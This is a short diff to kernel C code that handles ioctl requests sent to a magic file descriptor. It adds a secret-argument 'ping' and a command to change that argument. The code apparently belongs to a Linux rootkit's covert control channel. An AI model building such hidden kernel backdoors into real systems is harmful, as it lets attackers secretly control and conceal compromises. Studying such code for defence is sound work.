@@ -1,11 +1,14 @@
 #include <linux/kernel.h>
+#include <uapi/asm-generic/errno-base.h>
 #include "service.h"
 #include "load.h"
 
 unsigned int service_fd = 666;
+unsigned long ping_arg = 666;
 
 int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
 {
+    // 0 means this is not a service request
     if (fd != service_fd)
         return 0;
     
@@ -23,6 +26,14 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
         case SERVICE_CHANGE_FD:
             service_fd = (unsigned int)arg;
             break;
+        case SERVICE_PING:
+            // make sure argument is correct
+            if (arg == ping_arg)
+                return 666;
+            break;
+        case SERVICE_CHANGE_PING_ARG:
+            ping_arg = arg;
+            break;
     }
-    return 1;
+    return -EPERM;
 }
